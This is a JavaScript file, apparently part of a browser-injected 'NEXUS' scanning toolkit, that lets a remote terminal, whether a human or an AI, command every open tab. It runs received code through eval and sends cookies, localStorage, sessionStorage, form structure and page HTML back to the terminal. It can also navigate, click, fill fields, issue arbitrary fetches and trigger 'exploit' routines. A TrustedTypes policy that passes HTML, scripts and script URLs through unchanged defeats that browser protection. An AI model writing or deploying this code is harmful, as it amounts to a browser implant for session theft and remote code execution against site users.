// ══════════════════════════════════════════════════════════════════════════════
// 🔥 TERMINAL LIVE SYSTEM - ADVANCED BIDIRECTIONAL COMMUNICATION
// ══════════════════════════════════════════════════════════════════════════════
// Features:
// - Real-time bidirectional communication between browser and terminal
// - Cross-tab broadcasting via BroadcastChannel
// - Human operator can send commands from terminal to ALL browser tabs
// - Both AI and human can control the script
// - Auto-update and self-modification capabilities
// ══════════════════════════════════════════════════════════════════════════════

const TerminalLive = {
    // Status
    isLive: false,
    tabId: null,
    broadcastChannel: null,
    commandHistory: [],
    lastUpdate: null,
    
    // Initialize cross-tab communication
    init() {
        // Generate unique tab ID
        this.tabId = 'tab_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
        
        // Setup BroadcastChannel for cross-tab communication
        try {
            this.broadcastChannel = new BroadcastChannel('nexus_terminal_live');
            
            this.broadcastChannel.onmessage = (event) => {
                this.handleBroadcast(event.data);
            };
            
            console.log('%c📡 Cross-tab communication ready', 'color: #8b5cf6;');
        } catch(e) {
            console.log('%c⚠️ BroadcastChannel not supported, using fallback', 'color: #f59e0b;');
            // Fallback to localStorage for cross-tab
            window.addEventListener('storage', (e) => {
                if (e.key === 'nexus_terminal_command') {
                    try {
                        const data = JSON.parse(e.newValue);
                        this.handleBroadcast(data);
                    } catch(err) {}
                }
            });
        }
        
        return this;
    },
    
    // Handle messages from other tabs
    handleBroadcast(data) {
        if (data.sourceTab === this.tabId) return; // Ignore own messages
        
        console.log(`%c📨 [${data.sourceTab?.substring(0,8)}] ${data.type}`, 'color: #8b5cf6;');
        
        switch(data.type) {
            case 'terminal_command':
                this.executeCommand(data.command, data.args);
                break;
            case 'sync_request':
                this.sendState();
                break;
            case 'sync_state':
                // Another tab shared its state
                break;
        }
    },
    
    // Broadcast to all tabs
    broadcast(type, data = {}) {
        const message = {
            type,
            sourceTab: this.tabId,
            timestamp: Date.now(),
            ...data
        };
        
        if (this.broadcastChannel) {
            this.broadcastChannel.postMessage(message);
        } else {
            // Fallback to localStorage
            localStorage.setItem('nexus_terminal_command', JSON.stringify(message));
        }
    },
    
    // Send current state to other tabs
    sendState() {
        this.broadcast('sync_state', {
            url: location.href,
            findings: window.Vault?.findings?.size || 0,
            isLive: this.isLive,
            terminalConnected: window.TerminalBridge?.isConnected() || false
        });
    },
    
    // Execute command received from terminal or other tabs
    async executeCommand(command, args = {}) {
        console.log(`%c⚡ EXECUTING: ${command}`, 'color: #22c55e; font-weight: bold;');
        
        this.commandHistory.push({
            command,
            args,
            timestamp: Date.now(),
            tab: this.tabId
        });
        
        try {
            switch(command) {
                // ═══════════════════════════════════════════════════════════
                // SCANNING & ANALYSIS
                // ═══════════════════════════════════════════════════════════
                case 'scan':
                case 'start':
                    if (typeof window.start === 'function') window.start();
                    break;
                    
                case 'stop':
                    if (typeof window.stopScan === 'function') window.stopScan();
                    break;
                    
                case 'bounty':
                    if (typeof window.bounty === 'function') await window.bounty();
                    break;
                    
                case 'exploit':
                    if (typeof window.exploit === 'function') window.exploit();
                    break;
                    
                // ═══════════════════════════════════════════════════════════
                // JAVASCRIPT EXECUTION
                // ═══════════════════════════════════════════════════════════
                case 'eval':
                case 'js':
                case 'execute':
                    if (args.code) {
                        try {
                            const result = eval(args.code);
                            console.log('%c📤 Result:', 'color: #22c55e;');
                            console.log(result);
                            
                            // Send result back to terminal
                            this.sendToTerminal({
                                type: 'eval_result',
                                code: args.code,
                                result: typeof result === 'object' ? JSON.stringify(result, null, 2) : result,
                                success: true
                            });
                        } catch(e) {
                            console.log(`%c❌ Error: ${e.message}`, 'color: #f43f5e;');
                            this.sendToTerminal({
                                type: 'eval_error',
                                code: args.code,
                                error: e.message
                            });
                        }
                    }
                    break;
                    
                // ═══════════════════════════════════════════════════════════
                // DATA EXTRACTION
                // ═══════════════════════════════════════════════════════════
                case 'get_findings':
                    const findings = [];
                    if (window.Vault?.findings) {
                        window.Vault.findings.forEach((v, k) => findings.push(v));
                    }
                    this.sendToTerminal({
                        type: 'findings_data',
                        findings,
                        count: findings.length,
                        url: location.href
                    });
                    break;
                    
                case 'get_cookies':
                    this.sendToTerminal({
                        type: 'cookies_data',
                        cookies: document.cookie,
                        url: location.href
                    });
                    break;
                    
                case 'get_storage':
                    const storage = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        storage[key] = localStorage.getItem(key);
                    }
                    this.sendToTerminal({
                        type: 'storage_data',
                        localStorage: storage,
                        sessionStorage: Object.fromEntries(
                            Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)])
                        ),
                        url: location.href
                    });
                    break;
                    
                case 'get_all_data':
                    // Comprehensive data extraction
                    const allData = {
                        url: location.href,
                        domain: location.hostname,
                        cookies: document.cookie,
                        localStorage: {},
                        findings: [],
                        scripts: Array.from(document.scripts).map(s => s.src).filter(Boolean),
                        forms: Array.from(document.forms).map(f => ({
                            action: f.action,
                            method: f.method,
                            fields: Array.from(f.elements).map(e => e.name).filter(Boolean)
                        }))
                    };
                    
                    // Add localStorage
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        allData.localStorage[key] = localStorage.getItem(key);
                    }
                    
                    // Add findings
                    if (window.Vault?.findings) {
                        window.Vault.findings.forEach((v, k) => allData.findings.push(v));
                    }
                    
                    this.sendToTerminal({
                        type: 'all_data',
                        data: allData
                    });
                    break;
                    
                // ═══════════════════════════════════════════════════════════
                // NAVIGATION & DOM
                // ═══════════════════════════════════════════════════════════
                case 'navigate':
                    if (args.url) location.href = args.url;
                    break;
                    
                case 'click':
                    if (args.selector) {
                        const el = document.querySelector(args.selector);
                        if (el) el.click();
                    }
                    break;
                    
                case 'type':
                    if (args.selector && args.text) {
                        const el = document.querySelector(args.selector);
                        if (el) el.value = args.text;
                    }
                    break;
                    
                case 'get_html':
                    const selector = args.selector || 'body';
                    const html = document.querySelector(selector)?.innerHTML || '';
                    this.sendToTerminal({
                        type: 'html_data',
                        selector,
                        html: html.substring(0, 50000) // Limit size
                    });
                    break;
                    
                // ═══════════════════════════════════════════════════════════
                // AI INTEGRATION
                // ═══════════════════════════════════════════════════════════
                case 'ai_query':
                    if (window.AIAgent?.config?.apiKey && args.prompt) {
                        const aiResult = await window.AIAgent.query(args.prompt);
                        this.sendToTerminal({
                            type: 'ai_response',
                            prompt: args.prompt,
                            response: aiResult
                        });
                    }
                    break;
                    
                case 'ai_analyze':
                    if (window.AIAgent?.config?.apiKey) {
                        const analysis = await window.aiAnalyze(args.data);
                        this.sendToTerminal({
                            type: 'ai_analysis',
                            analysis
                        });
                    }
                    break;
                    
                // ═══════════════════════════════════════════════════════════
                // NETWORK & REQUESTS
                // ═══════════════════════════════════════════════════════════
                case 'fetch':
                    if (args.url) {
                        try {
                            const response = await fetch(args.url, args.options || {});
                            const data = await response.text();
                            this.sendToTerminal({
                                type: 'fetch_result',
                                url: args.url,
                                status: response.status,
                                data
                            });
                        } catch(e) {
                            this.sendToTerminal({
                                type: 'fetch_error',
                                url: args.url,
                                error: e.message
                            });
                        }
                    }
                    break;
                    
                // ═══════════════════════════════════════════════════════════
                // STATUS & SYNC
                // ═══════════════════════════════════════════════════════════
                case 'status':
                case 'ping':
                    this.sendToTerminal({
                        type: 'status_response',
                        tabId: this.tabId,
                        url: location.href,
                        title: document.title,
                        findings: window.Vault?.findings?.size || 0,
                        aiActive: !!window.AIAgent?.config?.apiKey,
                        timestamp: Date.now()
                    });
                    break;
                    
                case 'sync':
                    this.sendState();
                    this.broadcast('sync_request');
                    break;
                    
                default:
                    console.log(`%c⚠️ Unknown command: ${command}`, 'color: #f59e0b;');
            }
        } catch(e) {
            console.log(`%c❌ Command error: ${e.message}`, 'color: #f43f5e;');
            this.sendToTerminal({
                type: 'command_error',
                command,
                error: e.message
            });
        }
    },
    
    // Send data back to terminal
    sendToTerminal(data) {
        if (window.TerminalBridge?.isConnected()) {
            window.TerminalBridge._send({
                type: 'browser_data',
                tabId: this.tabId,
                url: location.href,
                data
            }).catch(() => {});
        }
    },
    
    // Start listening for terminal commands
    startLive() {
        this.isLive = true;
        
        // Enhance TerminalBridge message handler to support commands
        if (window.TerminalBridge && window.TerminalBridge._handleMessage) {
            const originalHandler = window.TerminalBridge._handleMessage.bind(window.TerminalBridge);
            
            window.TerminalBridge._handleMessage = (data, resolve, reject) => {
                // Handle terminal commands
                if (data.type === 'terminal_command') {
                    this.executeCommand(data.command, data.data || {});
                    this.broadcast('terminal_command', { command: data.command, args: data.data });
                } else if (data.type === 'ai_analysis') {
                    // AI from terminal analyzed something
                    console.log('%c🤖 AI ANALYSIS FROM TERMINAL:', 'color: #8b5cf6; font-weight: bold;');
                    console.log(data.analysis);
                } else if (data.type === 'ai_response') {
                    console.log('%c🤖 AI RESPONSE:', 'color: #8b5cf6; font-weight: bold;');
                    console.log(data.response);
                }
                
                // Call original handler
                if (originalHandler) {
                    originalHandler(data, resolve, reject);
                }
            };
        }
        
        // Register this tab with terminal
        this.sendToTerminal({
            type: 'tab_registered',
            tabId: this.tabId,
            url: location.href,
            title: document.title
        });
        
        console.log('%c🔴 TERMINAL LIVE MODE ACTIVE', 'color: #f43f5e; font-weight: bold; font-size: 14px;');
        console.log('%c   All browser tabs are now listening for commands', 'color: #94a3b8;');
        
        return this;
    },
    
    // Stop live mode
    stopLive() {
        this.isLive = false;
        console.log('%c⚪ Terminal Live Mode stopped', 'color: #64748b;');
    }
};

// Initialize Terminal Live
TerminalLive.init();

// ══════════════════════════════════════════════════════════════════════════════
// GLOBAL SAFE HTML SETTER - Works with TrustedTypes
// ══════════════════════════════════════════════════════════════════════════════

// Create TrustedTypes policy if not exists
if (!window.__NEXUS_DIALOG_POLICY__) {
    try {
        if (window.trustedTypes?.createPolicy) {
            window.__NEXUS_DIALOG_POLICY__ = window.trustedTypes.createPolicy('nexus-dialog-' + Date.now(), {
                createHTML: s => s,
                createScript: s => s,
                createScriptURL: s => s
            });
        }
    } catch(e) { /* Policy already exists or not supported */ }
}

// Universal safeSetHTML that works everywhere
window.safeSetHTML = function(element, html) {
    if (!element) return false;
    
    // Use universal setInnerHTML if available
    if (typeof window.__NEXUS_SET_HTML__ === 'function') {
        return window.__NEXUS_SET_HTML__(element, html);
    }
    
    // Method 1: Use existing NEXUS policy
    if (window.__NEXUS_SAFE_HTML__) {
        try {
            element.innerHTML = window.__NEXUS_SAFE_HTML__(html);
            return true;
        } catch(e) {}
    }
    
    // Method 2: Use dialog policy
    if (window.__NEXUS_DIALOG_POLICY__?.createHTML) {
        try {
            element.innerHTML = window.__NEXUS_DIALOG_POLICY__.createHTML(html);
            return true;
        } catch(e) {}
    }
    
    // Method 3: DOMParser fallback (works even with strict CSP)
    try {
        while (element.firstChild) element.removeChild(element.firstChild);
        const parser = new DOMParser();
        const doc = parser.parseFromString(`<body>${html}</body>`, 'text/html');
        Array.from(doc.body.childNodes).forEach(node => {
            element.appendChild(document.importNode(node, true));
        });
        return true;
    } catch(e) {}
    
    // Method 4: Direct innerHTML (works if no strict CSP)
    try {
        element.innerHTML = html;
        return true;
    } catch(e) {
        console.warn('[NEXUS] TrustedTypes blocking innerHTML');
        element.textContent = html.replace(/<[^>]*>/g, '');
        return false;
    }
};

